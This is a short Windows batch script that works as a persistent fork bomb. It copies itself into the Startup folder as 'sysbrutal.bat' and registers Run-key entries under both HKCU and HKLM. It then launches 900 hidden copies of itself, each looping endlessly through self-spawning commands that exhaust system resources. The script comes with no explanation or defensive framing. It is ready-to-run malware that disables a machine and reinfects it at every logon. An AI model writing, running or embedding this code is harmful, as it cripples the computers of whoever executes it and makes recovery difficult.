@echo off
if "%~1"=="bg" goto :bg

set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy /y "%~f0" "%STARTUP%\sysbrutal.bat" >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SysBrutal /t REG_SZ /d "%STARTUP%\sysbrutal.bat" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SysBrutal /t REG_SZ /d "%STARTUP%\sysbrutal.bat" /f >nul 2>&1

for /L %%i in (1,1,900) do start "" /min cmd /c "%~f0" bg
exit

:bg
:loop
%0|%0
%0|%0
%0|%0
%0|%0
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
start "" /min cmd /c "%~f0" bg
%0|%0
%0|%0
%0|%0
%0|%0
goto loop
